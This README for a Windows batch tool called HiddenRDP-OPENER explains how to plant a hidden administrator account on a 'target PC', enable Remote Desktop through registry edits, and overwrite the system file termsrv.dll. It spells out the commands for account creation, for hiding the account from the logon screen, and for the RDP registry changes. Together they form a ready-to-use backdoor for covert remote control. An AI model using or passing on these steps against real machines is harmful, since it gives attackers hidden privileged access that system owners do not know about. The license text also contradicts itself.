# HiddenRDP-OPENER

This script enables Remote Desktop Protocol (RDP) compatibility on any Windows system by creating a hidden administrative profile and modifying registry settings. It is open source, free to use, and has no conditions.

---

## Requirements  
- **Supported Operating Systems:**  
  - Windows 7  
  - Windows 8  
  - Windows 10  
  - *Note: Not tested on Windows XP.*  

---

## How It Works  
1. Creates a hidden user profile with administrative privileges.  
2. Modifies registry settings to enable RDP connections on the target Windows system.  

---

## Configuration  

### Step 1: Edit the Script  
1. Open `RDPScript.bat` in a text editor on your PC.  
2. Make the following changes:  

   #### User Account Configuration  
   `net user hidden 123123 /ADD`  
   - Replace `hidden` with the desired username for the hidden account.  
   - Replace `123123` with the desired password for the account.  

   #### File Path Configuration  
   `xcopy "termsrv.dll" "%windir%\System32\" /s /h /q`  
   - Replace `termsrv.dll` with the full path to the `termsrv.dll` file on the target PC.  
     Example: `C:\Users\comix\Downloads\termsrv.dll`.  

3. Move both `termsrv.dll` and `RDPScript.bat` to the target PC.  

---

## Delete Configuration  

### Step 1: Unhide the Profile  
To delete the hidden profile, modify the following line in `RDPScript.bat`:  
`REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000000 /f`  

Change it to:  
`REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000001 /f`  

This will make the hidden profile visible.  

---

### Step 2: Disable RDP  
To disable RDP, modify the following line:  
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000000 /f`  

Change it to:  
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000001 /f`  

---

## License  
This project is open source and free to use with no conditions.  

Copyright © 2019 Soufiyan AKAABOUB
All rights reserved.  
